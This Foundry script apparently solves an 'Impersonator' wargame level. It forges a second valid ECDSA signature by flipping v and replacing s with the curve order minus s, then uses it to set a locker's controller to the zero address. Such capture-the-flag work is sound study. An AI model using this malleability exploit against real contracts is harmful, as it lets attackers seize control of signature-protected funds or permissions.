// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {Impersonator, ECLocker} from "src/32.Impersonator.sol";

contract ImpersonatorScript is Script {
    bytes32 N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0xC0231b5c1926a3c41AB6e75C131DC39A2858aBbB;

        Impersonator impersonator = Impersonator(instanceAddr);
        ECLocker locker = impersonator.lockers(0);

        uint8 v = 0x1b; // 27
        bytes32 r = 0x1932cb842d3e27f54f79f7be0289437381ba2410fdefbae36850bee9c41e3b91;
        bytes32 s = 0x78489c64a0db16c40ef986beccc8f069ad5041e5b992d76fe76bba057d9abff2;

        uint8 newV = 27 + (1 - (v - 27));
        bytes32 newS = bytes32(uint256(N) - uint256(s));

        locker.changeController(newV, r, newS, address(0));

        vm.stopBroadcast();
    }
}
